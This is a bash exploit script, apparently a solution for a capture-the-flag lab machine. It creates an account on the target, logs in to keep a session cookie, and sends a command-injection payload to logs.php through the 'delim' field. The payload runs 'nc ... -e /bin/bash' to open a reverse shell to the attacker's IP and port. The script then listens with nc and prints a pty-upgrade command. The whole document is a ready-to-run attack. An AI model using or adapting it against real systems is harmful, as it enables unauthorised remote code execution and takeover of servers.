## First arg is your IP
## Second arg is desired port
## Third arg (optional) is victim IP

attk_ip=${1}
attk_port=${2}
if [[ -z ${3} ]]; then
	target_ip='10.10.11.104'
else
	target_ip=${3}
fi

echo "Type 'yes' if you need me to create a user (if the script has failed you should try letting me create a user): "
read menu
if [[ ${menu} == 'yes' ]]; then
	echo 'Creating account...'
	curl -X POST -d "username=addie&password=passie&confirm=passie" ${target_ip}/accounts.php &>/dev/null
fi

echo 'Loggin in to establish session...'
curl -X POST -c cookies.txt -d 'username=addie&password=passie' ${target_ip}/login.php &>/dev/null

payload='delim=space; $(nc '"${attk_ip} ${attk_port}"' -e /bin/bash)'
echo "Sending payload '${payload}'..."
sleep 1 && curl -X POST ${target_ip}/logs.php -b cookies.txt -d "${payload}" &>/dev/null &

echo "Send the following to get a good terminal:"
echo "    python -c \"import pty; pty.spawn('/bin/bash')\""

nc -lvp ${attk_port}
